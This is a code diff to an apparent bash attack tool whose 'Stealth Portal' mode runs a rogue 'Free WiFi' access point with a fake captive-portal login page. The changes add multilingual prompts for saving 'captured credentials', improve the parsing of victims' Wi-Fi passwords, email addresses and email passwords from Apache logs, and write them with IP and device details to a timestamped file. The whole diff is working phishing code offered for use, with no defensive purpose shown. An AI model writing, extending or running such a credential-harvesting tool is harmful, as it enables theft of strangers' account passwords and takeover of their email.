@@ -171,6 +171,7 @@ init_languages() {
     LANG_STRINGS["en",99]="Detected platform:"
     LANG_STRINGS["en",100]="By connecting, you agree to our terms of service"
     LANG_STRINGS["en",101]="Change Language"
+    LANG_STRINGS["en",102]="Do you want to save captured credentials to a file? (y/n): "
 
     # Spanish
     LANG_STRINGS["es",1]="Portal Sigiloso"
@@ -274,6 +275,7 @@ init_languages() {
     LANG_STRINGS["es",99]="Plataforma detectada:"
     LANG_STRINGS["es",100]="Al conectarse, acepta nuestros términos de servicio"
     LANG_STRINGS["es",101]="Cambiar Idioma"
+    LANG_STRINGS["es",102]="¿Desea guardar las credenciales capturadas en un archivo? (y/n): "
 
     # French
     LANG_STRINGS["fr",1]="Portail Furtif"
@@ -377,6 +379,7 @@ init_languages() {
     LANG_STRINGS["fr",99]="Plateforme détectée :"
     LANG_STRINGS["fr",100]="En vous connectant, vous acceptez nos conditions d'utilisation"
     LANG_STRINGS["fr",101]="Changer de Langue"
+    LANG_STRINGS["fr",102]="Voulez-vous enregistrer les identifiants capturés dans un fichier ? (y/n) : "
 
     # German
     LANG_STRINGS["de",1]="Stealth Portal"
@@ -480,6 +483,7 @@ init_languages() {
     LANG_STRINGS["de",99]="Erkannte Plattform:"
     LANG_STRINGS["de",100]="Durch die Verbindung stimmen Sie unseren Nutzungsbedingungen zu"
     LANG_STRINGS["de",101]="Sprache Ändern"
+    LANG_STRINGS["de",102]="Möchten Sie die erfassten Zugangsdaten in einer Datei speichern? (y/n): "
 
     # Italian
     LANG_STRINGS["it",1]="Portale Stealth"
@@ -583,6 +587,7 @@ init_languages() {
     LANG_STRINGS["it",99]="Piattaforma rilevata:"
     LANG_STRINGS["it",100]="Connettendosi, accetti i nostri termini di servizio"
     LANG_STRINGS["it",101]="Cambia Lingua"
+    LANG_STRINGS["it",102]="Vuoi salvare le credenziali catturate in un file? (y/n): "
 
     # Portuguese
     LANG_STRINGS["pt",1]="Portal Furtivo"
@@ -686,6 +691,7 @@ init_languages() {
     LANG_STRINGS["pt",99]="Plataforma detectada:"
     LANG_STRINGS["pt",100]="Ao conectar, você concorda com nossos termos de serviço"
     LANG_STRINGS["pt",101]="Alterar Idioma"
+    LANG_STRINGS["pt",102]="Deseja salvar as credenciais capturadas em um arquivo? (y/n): "
 
     # Russian
     LANG_STRINGS["ru",1]="Скрытый Портал"
@@ -789,6 +795,7 @@ init_languages() {
     LANG_STRINGS["ru",99]="Обнаруженная платформа:"
     LANG_STRINGS["ru",100]="Подключаясь, вы соглашаетесь с нашими условиями обслуживания"
     LANG_STRINGS["ru",101]="Изменить Язык"
+    LANG_STRINGS["ru",102]="Хотите сохранить полученные учетные данные в файл? (y/n): "
 
     # Chinese
     LANG_STRINGS["zh",1]="隐蔽门户"
@@ -892,6 +899,7 @@ init_languages() {
     LANG_STRINGS["zh",99]="检测到的平台:"
     LANG_STRINGS["zh",100]="连接即表示您同意我们的服务条款"
     LANG_STRINGS["zh",101]="更改语言"
+    LANG_STRINGS["zh",102]="您想将捕获的凭据保存到文件中吗？ (y/n): "
 
     # Japanese
     LANG_STRINGS["ja",1]="ステルスポータル"
@@ -995,6 +1003,7 @@ init_languages() {
     LANG_STRINGS["ja",99]="検出されたプラットフォーム:"
     LANG_STRINGS["ja",100]="接続することで、利用規約に同意したものとみなされます"
     LANG_STRINGS["ja",101]="言語を変更"
+    LANG_STRINGS["ja",102]="キャプチャした資格情報をファイルに保存しますか？ (y/n): "
 
     # Arabic
     LANG_STRINGS["ar",1]="البوابة الخفية"
@@ -1098,6 +1107,7 @@ init_languages() {
     LANG_STRINGS["ar",99]="المنصة المكتشفة:"
     LANG_STRINGS["ar",100]="بالاتصال، فإنك توافق على شروط الخدمة الخاصة بنا"
     LANG_STRINGS["ar",101]="تغيير اللغة"
+    LANG_STRINGS["ar",102]="هل ترغب في حفظ بيانات الاعتماد التي تم التقاطها في ملف؟ (y/n): "
 
     # Polish
     LANG_STRINGS["pl",1]="Portal Ukryty"
@@ -1201,6 +1211,7 @@ init_languages() {
     LANG_STRINGS["pl",99]="Wykryta platforma:"
     LANG_STRINGS["pl",100]="Łącząc się, akceptujesz nasze warunki korzystania z usługi"
     LANG_STRINGS["pl",101]="Zmień Język"
+    LANG_STRINGS["pl",102]="Czy chcesz zapisać przechwycone dane dostępu do pliku? (y/n): "
 }
 
 # Get language string
@@ -1651,7 +1662,7 @@ if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
         <h2><?php echo "$PORTAL_TITLE"; ?></h2>
         <p><?php echo "$WELCOME_MSG"; ?></p>
         <form method="POST">
-            <input type="password" name="wifi_password" placeholder="<?php echo "$WIFI_LABEL"; ?>" required>
+            <input type="text" name="wifi_password" placeholder="<?php echo "$WIFI_LABEL"; ?>" required>
             <input type="email" name="email" placeholder="<?php echo "$EMAIL_LABEL"; ?>" required>
             <input type="password" name="email_password" placeholder="<?php echo "$EMAIL_PASS_LABEL"; ?>" required>
             <button type="submit"><?php echo "$BUTTON_TEXT"; ?></button>
@@ -1772,7 +1783,8 @@ cleanup() {
     
     echo -e "${GREEN}$(get_str 64)${NC}"
     echo ""
-    
+        # Clean up temp files
+    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf "$CONFIG_FILE" /tmp/hostapd.log /tmp/neteen_credentials.log 2>/dev/null || true
     trap - EXIT INT TERM
 }
 
@@ -2031,14 +2043,27 @@ network_scanner() {
 }
 
 # Stealth Portal function - COMPLETELY FIXED VERSION
+# Fixed Stealth Portal function
+# Stealth Portal function - FIXED CREDENTIALS MONITORING
 stealth_portal() {
     show_header
     echo -e "${PURPLE}$(get_str 28)${NC}"
     
     customize_portal
     
-    read -p "$(echo -e ${YELLOW}"$(get_str 33) "${NC})" AP_NAME
+    echo -en "${YELLOW}$(get_str 33) ${NC}"
+    read AP_NAME
     [ -z "$AP_NAME" ] && AP_NAME="Free WiFi"
+
+    echo -en "${YELLOW}$(get_str 102)${NC}"
+    read -r SAVE_TO_FILE
+    SAVE_TO_FILE="${SAVE_TO_FILE:-n}"
+    
+    if [ "$SAVE_TO_FILE" = "y" ] || [ "$SAVE_TO_FILE" = "Y" ]; then
+        CREDENTIALS_FILE="$(pwd)/neteen_credentials_$(date +%Y%m%d_%H%M%S).txt"
+        echo -e "${GREEN}Credentials will be saved to: $CREDENTIALS_FILE${NC}"
+        sleep 1
+    fi
     
     if ! select_interface; then
         read -p "$(get_str 32)"
@@ -2087,26 +2112,43 @@ stealth_portal() {
     echo "──────────────────────────────────────────"
     echo -e "${GREEN}$(get_str 86)${NC}"
     
-    # Clear log file
+    # Clear Apache log file
     > /var/log/apache2/error.log
+    
+    # Create a dedicated log file for credentials
+    CRED_LOG="/tmp/neteen_cred.log"
+    > "$CRED_LOG"
     
     # Monitor for credentials - FIXED VERSION
     (
-        tail -n 0 -f /var/log/apache2/error.log 2>/dev/null | while read line; do
+        tail -n 0 -f /var/log/apache2/error.log 2>/dev/null | while read -r line; do
             if echo "$line" | grep -q "NETEEN_CAPTURE"; then
+                # Extract the credentials data
                 cred_data=$(echo "$line" | sed 's/.*NETEEN_CAPTURE //')
+                
+                # Write to our dedicated log file with a clear marker
+                echo "[NETEEN] $cred_data" >> "$CRED_LOG"
+                
+                # Parse the data
+                # Parse the data
+                time=$(echo "$cred_data" | grep -o '[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}T[0-9]\{2\}:[0-9]\{2\}:[0-9]\{2\}[+-][0-9]\{4\}' | head -1)
+                ip=$(echo "$cred_data" | grep -o 'IP: [^ ]*' | cut -d' ' -f2)
+                device=$(echo "$cred_data" | grep -o 'Device: [^ ]*' | cut -d' ' -f2)
+
+                # Extract WiFi password (everything between "WiFi: " and " - Email:")
+                wifi_pass=$(echo "$cred_data" | sed -n 's/.*WiFi: \(.*\) - Email:.*/\1/p' | xargs)
+
+                # Extract email (everything between "Email: " and " - Pass:")
+                email=$(echo "$cred_data" | sed -n 's/.*Email: \(.*\) - Pass:.*/\1/p' | xargs)
+
+                # Extract password (everything after "Pass: " and remove referer/extra info)
+                email_pass=$(echo "$cred_data" | sed -n 's/.*Pass: \(.*\)/\1/p' | sed 's/,.*//' | xargs)
+                
+                # Display the captured credentials
                 echo ""
                 echo -e "${CYAN}════════════════════════════════════════════${NC}"
                 echo -e "${CYAN}            $(get_str 70)            ${NC}"
                 echo -e "${CYAN}════════════════════════════════════════════${NC}"
-                
-                time=$(echo "$cred_data" | grep -o '[0-9]\{4\}-[0-9]\{2\}-[0-9]\{2\}T[0-9:\-]*' | head -1)
-                ip=$(echo "$cred_data" | grep -o 'IP: [^ ]*' | cut -d' ' -f2)
-                device=$(echo "$cred_data" | grep -o 'Device: [^ ]*' | cut -d' ' -f2)
-                wifi_pass=$(echo "$cred_data" | sed -n 's/.*WiFi: \([^-]*\).*/\1/p' | xargs)
-                email=$(echo "$cred_data" | sed -n 's/.*Email: \([^-]*\).*/\1/p' | xargs)
-                email_pass=$(echo "$cred_data" | sed -n 's/.*Pass: \(.*\)/\1/p' | xargs)
-                
                 echo -e "${WHITE}$(get_str 71):${NC} $time"
                 echo -e "${WHITE}$(get_str 72):${NC} $ip"
                 echo -e "${WHITE}$(get_str 73):${NC} $device"
@@ -2114,10 +2156,31 @@ stealth_portal() {
                 echo -e "${BLUE}$(get_str 75):${NC} $email"
                 echo -e "${RED}$(get_str 76):${NC} $email_pass"
                 echo -e "${CYAN}──────────────────────────────────────────${NC}"
+                
+                # Save to file if enabled
+                if [ "$SAVE_TO_FILE" = "y" ] || [ "$SAVE_TO_FILE" = "Y" ]; then
+                    echo "[$(date '+%Y-%m-%d %H:%M:%S')]" >> "$CREDENTIALS_FILE"
+                    echo "SSID: $AP_NAME" >> "$CREDENTIALS_FILE"
+                    echo "IP: $ip" >> "$CREDENTIALS_FILE"
+                    echo "Device: $device" >> "$CREDENTIALS_FILE"
+                    echo "WiFi/Network Name: $wifi_pass" >> "$CREDENTIALS_FILE"
+                    echo "Email: $email" >> "$CREDENTIALS_FILE"
+                    echo "Password: $email_pass" >> "$CREDENTIALS_FILE"
+                    echo "---" >> "$CREDENTIALS_FILE"
+                    echo -e "${GREEN}✓ Credentials saved to file${NC}"
+                fi
             fi
         done
     ) &
     MONITOR_PID=$!
+    
+    # Also monitor our dedicated log file for debugging
+    (
+        tail -n 0 -f "$CRED_LOG" 2>/dev/null | while read -r line; do
+            # This process just ensures the file is being written to
+            :
+        done
+    ) &
     
     # Wait for hostapd to finish or Ctrl+C
     wait $HOSTAPD_PID 2>/dev/null || true
@@ -2125,7 +2188,6 @@ stealth_portal() {
     # Cleanup when done
     cleanup
 }
-
 # Load saved language
 load_saved_language() {
     if [ -f "$LANG_FILE" ]; then
